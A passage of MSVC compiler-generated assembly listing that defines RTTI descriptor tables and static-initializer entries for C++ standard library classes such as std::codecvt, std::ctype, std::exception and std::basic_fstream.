;	COMDAT ?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B
_BSS	SEGMENT
?_Psave@?$_Facetptr@V?$ctype@D@std@@@std@@2PBVfacet@locale@2@B DD 01H DUP (?) ; std::_Facetptr<std::ctype<char> >::_Psave
_BSS	ENDS
;	COMDAT ?_Psave@?$_Facetptr@V?$codecvt@DDU_Mbstatet@@@std@@@std@@2PBVfacet@locale@2@B
_BSS	SEGMENT
?_Psave@?$_Facetptr@V?$codecvt@DDU_Mbstatet@@@std@@@std@@2PBVfacet@locale@2@B DD 01H DUP (?) ; std::_Facetptr<std::codecvt<char,char,_Mbstatet> >::_Psave
_BSS	ENDS
CRT$XCU	SEGMENT
?userlc$initializer$@@3P6AXXZA DD FLAT:??__Euserlc@@YAXXZ ; userlc$initializer$
CRT$XCU	ENDS
;	COMDAT ??_R1A@?0A@EA@?$codecvt@DDU_Mbstatet@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$codecvt@DDU_Mbstatet@@@std@@8 DD FLAT:??_R0?AV?$codecvt@DDU_Mbstatet@@@std@@@8 ; std::codecvt<char,char,_Mbstatet>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$codecvt@DDU_Mbstatet@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$codecvt@DDU_Mbstatet@@@std@@8
rdata$r	SEGMENT
??_R2?$codecvt@DDU_Mbstatet@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$codecvt@DDU_Mbstatet@@@std@@8 ; std::codecvt<char,char,_Mbstatet>::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@codecvt_base@std@@8
	DD	FLAT:??_R1A@?0A@EA@facet@locale@std@@8
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$codecvt@DDU_Mbstatet@@@std@@8
rdata$r	SEGMENT
??_R3?$codecvt@DDU_Mbstatet@@@std@@8 DD 00H		; std::codecvt<char,char,_Mbstatet>::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	05H
	DD	FLAT:??_R2?$codecvt@DDU_Mbstatet@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$codecvt@DDU_Mbstatet@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$codecvt@DDU_Mbstatet@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::codecvt<char,char,_Mbstatet> `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$codecvt@DDU_Mbstatet@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$codecvt@DDU_Mbstatet@@@std@@6B@
rdata$r	SEGMENT
??_R4?$codecvt@DDU_Mbstatet@@@std@@6B@ DD 00H		; std::codecvt<char,char,_Mbstatet>::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV?$codecvt@DDU_Mbstatet@@@std@@@8
	DD	FLAT:??_R3?$codecvt@DDU_Mbstatet@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@failure@ios_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@failure@ios_base@std@@8 DD FLAT:??_R0?AVfailure@ios_base@std@@@8 ; std::ios_base::failure::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2failure@ios_base@std@@8
rdata$r	SEGMENT
??_R2failure@ios_base@std@@8 DD FLAT:??_R1A@?0A@EA@failure@ios_base@std@@8 ; std::ios_base::failure::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@system_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@_System_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@runtime_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3failure@ios_base@std@@8
rdata$r	SEGMENT
??_R3failure@ios_base@std@@8 DD 00H			; std::ios_base::failure::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	05H
	DD	FLAT:??_R2failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R4failure@ios_base@std@@6B@
rdata$r	SEGMENT
??_R4failure@ios_base@std@@6B@ DD 00H			; std::ios_base::failure::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVfailure@ios_base@std@@@8
	DD	FLAT:??_R3failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$ctype@D@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$ctype@D@std@@8 DD FLAT:??_R0?AV?$ctype@D@std@@@8 ; std::ctype<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$ctype@D@std@@8
rdata$r	SEGMENT
??_R2?$ctype@D@std@@8 DD FLAT:??_R1A@?0A@EA@?$ctype@D@std@@8 ; std::ctype<char>::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@ctype_base@std@@8
	DD	FLAT:??_R1A@?0A@EA@facet@locale@std@@8
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$ctype@D@std@@8
rdata$r	SEGMENT
??_R3?$ctype@D@std@@8 DD 00H				; std::ctype<char>::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	05H
	DD	FLAT:??_R2?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$ctype@D@std@@@8
data$rs	SEGMENT
??_R0?AV?$ctype@D@std@@@8 DD FLAT:??_7type_info@@6B@	; std::ctype<char> `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$ctype@D@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$ctype@D@std@@6B@
rdata$r	SEGMENT
??_R4?$ctype@D@std@@6B@ DD 00H				; std::ctype<char>::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV?$ctype@D@std@@@8
	DD	FLAT:??_R3?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@ctype_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@ctype_base@std@@8 DD FLAT:??_R0?AUctype_base@std@@@8 ; std::ctype_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2ctype_base@std@@8
rdata$r	SEGMENT
??_R2ctype_base@std@@8 DD FLAT:??_R1A@?0A@EA@ctype_base@std@@8 ; std::ctype_base::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@facet@locale@std@@8
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3ctype_base@std@@8
rdata$r	SEGMENT
??_R3ctype_base@std@@8 DD 00H				; std::ctype_base::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	04H
	DD	FLAT:??_R2ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AUctype_base@std@@@8
data$rs	SEGMENT
??_R0?AUctype_base@std@@@8 DD FLAT:??_7type_info@@6B@	; std::ctype_base `RTTI Type Descriptor'
	DD	00H
	DB	'.?AUctype_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4ctype_base@std@@6B@
rdata$r	SEGMENT
??_R4ctype_base@std@@6B@ DD 00H				; std::ctype_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AUctype_base@std@@@8
	DD	FLAT:??_R3ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@codecvt_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@codecvt_base@std@@8 DD FLAT:??_R0?AVcodecvt_base@std@@@8 ; std::codecvt_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3codecvt_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2codecvt_base@std@@8
rdata$r	SEGMENT
??_R2codecvt_base@std@@8 DD FLAT:??_R1A@?0A@EA@codecvt_base@std@@8 ; std::codecvt_base::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@facet@locale@std@@8
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3codecvt_base@std@@8
rdata$r	SEGMENT
??_R3codecvt_base@std@@8 DD 00H				; std::codecvt_base::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	04H
	DD	FLAT:??_R2codecvt_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVcodecvt_base@std@@@8
data$rs	SEGMENT
??_R0?AVcodecvt_base@std@@@8 DD FLAT:??_7type_info@@6B@	; std::codecvt_base `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVcodecvt_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4codecvt_base@std@@6B@
rdata$r	SEGMENT
??_R4codecvt_base@std@@6B@ DD 00H			; std::codecvt_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVcodecvt_base@std@@@8
	DD	FLAT:??_R3codecvt_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R4facet@locale@std@@6B@
rdata$r	SEGMENT
??_R4facet@locale@std@@6B@ DD 00H			; std::locale::facet::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVfacet@locale@std@@@8
	DD	FLAT:??_R3facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Crt_new_delete@std@@8 DD FLAT:??_R0?AU_Crt_new_delete@std@@@8 ; std::_Crt_new_delete::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R2_Crt_new_delete@std@@8 DD FLAT:??_R1A@?0A@EA@_Crt_new_delete@std@@8 ; std::_Crt_new_delete::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R3_Crt_new_delete@std@@8 DD 00H			; std::_Crt_new_delete::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AU_Crt_new_delete@std@@@8
data$rs	SEGMENT
??_R0?AU_Crt_new_delete@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_Crt_new_delete `RTTI Type Descriptor'
	DD	00H
	DB	'.?AU_Crt_new_delete@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R13?0A@EA@_Crt_new_delete@std@@8 DD FLAT:??_R0?AU_Crt_new_delete@std@@@8 ; std::_Crt_new_delete::`RTTI Base Class Descriptor at (4,-1,0,64)'
	DD	00H
	DD	04H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R2facet@locale@std@@8
rdata$r	SEGMENT
??_R2facet@locale@std@@8 DD FLAT:??_R1A@?0A@EA@facet@locale@std@@8 ; std::locale::facet::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@_Facet_base@std@@8
	DD	FLAT:??_R13?0A@EA@_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R3facet@locale@std@@8
rdata$r	SEGMENT
??_R3facet@locale@std@@8 DD 00H				; std::locale::facet::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	03H
	DD	FLAT:??_R2facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVfacet@locale@std@@@8
data$rs	SEGMENT
??_R0?AVfacet@locale@std@@@8 DD FLAT:??_7type_info@@6B@	; std::locale::facet `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVfacet@locale@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R1A@?0A@EA@facet@locale@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@facet@locale@std@@8 DD FLAT:??_R0?AVfacet@locale@std@@@8 ; std::locale::facet::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Facet_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Facet_base@std@@8 DD FLAT:??_R0?AV_Facet_base@std@@@8 ; std::_Facet_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Facet_base@std@@8
rdata$r	SEGMENT
??_R2_Facet_base@std@@8 DD FLAT:??_R1A@?0A@EA@_Facet_base@std@@8 ; std::_Facet_base::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3_Facet_base@std@@8
rdata$r	SEGMENT
??_R3_Facet_base@std@@8 DD 00H				; std::_Facet_base::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Facet_base@std@@@8
data$rs	SEGMENT
??_R0?AV_Facet_base@std@@@8 DD FLAT:??_7type_info@@6B@	; std::_Facet_base `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_Facet_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_Facet_base@std@@6B@
rdata$r	SEGMENT
??_R4_Facet_base@std@@6B@ DD 00H			; std::_Facet_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_Facet_base@std@@@8
	DD	FLAT:??_R3_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_cast@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_cast@std@@8 DD FLAT:??_R0?AVbad_cast@std@@@8 ; std::bad_cast::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_cast@std@@8
rdata$r	SEGMENT
??_R2bad_cast@std@@8 DD FLAT:??_R1A@?0A@EA@bad_cast@std@@8 ; std::bad_cast::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3bad_cast@std@@8
rdata$r	SEGMENT
??_R3bad_cast@std@@8 DD 00H				; std::bad_cast::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_cast@std@@6B@
rdata$r	SEGMENT
??_R4bad_cast@std@@6B@ DD 00H				; std::bad_cast::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVbad_cast@std@@@8
	DD	FLAT:??_R3bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Iostream_error_category2@std@@8 DD FLAT:??_R0?AV_Iostream_error_category2@std@@@8 ; std::_Iostream_error_category2::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R2_Iostream_error_category2@std@@8 DD FLAT:??_R1A@?0A@EA@_Iostream_error_category2@std@@8 ; std::_Iostream_error_category2::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R3_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R3_Iostream_error_category2@std@@8 DD 00H		; std::_Iostream_error_category2::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Iostream_error_category2@std@@@8
data$rs	SEGMENT
??_R0?AV_Iostream_error_category2@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_Iostream_error_category2 `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_Iostream_error_category2@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_Iostream_error_category2@std@@6B@
rdata$r	SEGMENT
??_R4_Iostream_error_category2@std@@6B@ DD 00H		; std::_Iostream_error_category2::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_Iostream_error_category2@std@@@8
	DD	FLAT:??_R3_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@system_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@system_error@std@@8 DD FLAT:??_R0?AVsystem_error@std@@@8 ; std::system_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2system_error@std@@8
rdata$r	SEGMENT
??_R2system_error@std@@8 DD FLAT:??_R1A@?0A@EA@system_error@std@@8 ; std::system_error::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@_System_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@runtime_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3system_error@std@@8
rdata$r	SEGMENT
??_R3system_error@std@@8 DD 00H				; std::system_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	04H
	DD	FLAT:??_R2system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4system_error@std@@6B@
rdata$r	SEGMENT
??_R4system_error@std@@6B@ DD 00H			; std::system_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVsystem_error@std@@@8
	DD	FLAT:??_R3system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_System_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_System_error@std@@8 DD FLAT:??_R0?AV_System_error@std@@@8 ; std::_System_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_System_error@std@@8
rdata$r	SEGMENT
??_R2_System_error@std@@8 DD FLAT:??_R1A@?0A@EA@_System_error@std@@8 ; std::_System_error::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@runtime_error@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3_System_error@std@@8
rdata$r	SEGMENT
??_R3_System_error@std@@8 DD 00H			; std::_System_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	FLAT:??_R2_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4_System_error@std@@6B@
rdata$r	SEGMENT
??_R4_System_error@std@@6B@ DD 00H			; std::_System_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AV_System_error@std@@@8
	DD	FLAT:??_R3_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@error_category@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@error_category@std@@8 DD FLAT:??_R0?AVerror_category@std@@@8 ; std::error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R2error_category@std@@8
rdata$r	SEGMENT
??_R2error_category@std@@8 DD FLAT:??_R1A@?0A@EA@error_category@std@@8 ; std::error_category::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3error_category@std@@8
rdata$r	SEGMENT
??_R3error_category@std@@8 DD 00H			; std::error_category::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVerror_category@std@@@8
data$rs	SEGMENT
??_R0?AVerror_category@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::error_category `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVerror_category@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R1A@?0A@EA@runtime_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@runtime_error@std@@8 DD FLAT:??_R0?AVruntime_error@std@@@8 ; std::runtime_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2runtime_error@std@@8
rdata$r	SEGMENT
??_R2runtime_error@std@@8 DD FLAT:??_R1A@?0A@EA@runtime_error@std@@8 ; std::runtime_error::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3runtime_error@std@@8
rdata$r	SEGMENT
??_R3runtime_error@std@@8 DD 00H			; std::runtime_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4runtime_error@std@@6B@
rdata$r	SEGMENT
??_R4runtime_error@std@@6B@ DD 00H			; std::runtime_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVruntime_error@std@@@8
	DD	FLAT:??_R3runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD FLAT:??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD FLAT:??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@bad_alloc@std@@8
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	FLAT:??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 00H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVbad_array_new_length@std@@@8
	DD	FLAT:??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD FLAT:??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD FLAT:??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	FLAT:??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 00H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVbad_alloc@std@@@8
	DD	FLAT:??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD FLAT:??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD FLAT:??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	FLAT:??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 00H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	FLAT:??_R0?AVexception@std@@@8
	DD	FLAT:??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$basic_fstream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$basic_fstream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R0?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@@8 ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	09H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	FLAT:??_R3?$basic_fstream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$basic_fstream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R2?$basic_fstream@DU?$char_traits@D@std@@@std@@8 DD FLAT:??_R1A@?0A@EA@?$basic_fstream@DU?$char_traits@D@std@@@std@@8 ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Base Class Array'
	DD	FLAT:??_R1A@?0A@EA@?$basic_iostream@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@?0A@EA@?$basic_istream@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3EA@ios_base@std@@8
	DD	FLAT:??_R17A@3EA@?$_Iosb@H@std@@8
	DD	FLAT:??_R1BA@?0A@EA@?$basic_ostream@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3FA@?$basic_ios@DU?$char_traits@D@std@@@std@@8
	DD	FLAT:??_R1A@A@3EA@ios_base@std@@8
	DD	FLAT:??_R17A@3EA@?$_Iosb@H@std@@8
rdata$r	ENDS
;	COMDAT ??_R3?$basic_fstream@DU?$char_traits@D@std@@@std@@8
rdata$r	SEGMENT
??_R3?$basic_fstream@DU?$char_traits@D@std@@@std@@8 DD 00H ; std::basic_fstream<char,std::char_traits<char> >::`RTTI Class Hierarchy Descriptor'
	DD	03H
	DD	0aH
	DD	FLAT:??_R2?$basic_fstream@DU?$char_traits@D@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::basic_fstream<char,std::char_traits<char> > `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$basic_fstream@DU?$char_traits@D@std@@@std@@6B@
